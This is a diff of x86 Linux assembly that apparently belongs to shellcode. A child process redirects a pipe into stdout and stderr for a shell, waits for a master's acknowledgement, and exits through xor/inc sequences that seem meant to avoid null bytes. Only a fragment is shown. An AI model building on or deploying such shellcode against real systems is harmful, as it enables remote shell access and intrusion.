@@ -48,7 +48,7 @@ child:
 	int	0x80
 
 	cmp	eax,0
-	jne	leave
+	jne	leave_sh
 
 	; dup2(sh2c[0], 1)   (dup to stdout)
 	mov	eax,63
@@ -60,7 +60,7 @@ child:
 	int	0x80
 
 	cmp	eax,0
-	jne	leave
+	jne	leave_sh
 	
 	; dup2(sh2c[0], 2)   (dup to stderr)
 	mov	eax,63
@@ -73,19 +73,22 @@ child:
 	int	0x80
 
 	cmp	eax,0
-	jne	leave
+	jne	leave_sh
 
 parent:
 
-...
+;...
 
 
 child_dead:
 	; at most wait 2 seconds for master's ACK
-	cmp long [ebp+child_is_dead], 2
-	ja	leave_sh
-	cmp long [ebp+child_is_dead_ACK], 0
+	xor	eax,eax
+	cmp long [ebp+child_is_dead_ACK], eax
 	jne	leave_sh
+	inc	eax
+	inc	eax
+	cmp long [ebp+child_is_dead], eax
+	ja	leave_sh
 
 	inc byte [ebp]
 
@@ -102,8 +105,9 @@ child_dead:
 
 leave_sh:
 	; exit-point for BOTH parent and child
-	mov	eax,1
-	mov	ebx,0
+	xor	ebx,ebx
+	mov	eax,ebx
+	inc	eax
 	int	0x80
 
 ; =============================================================================
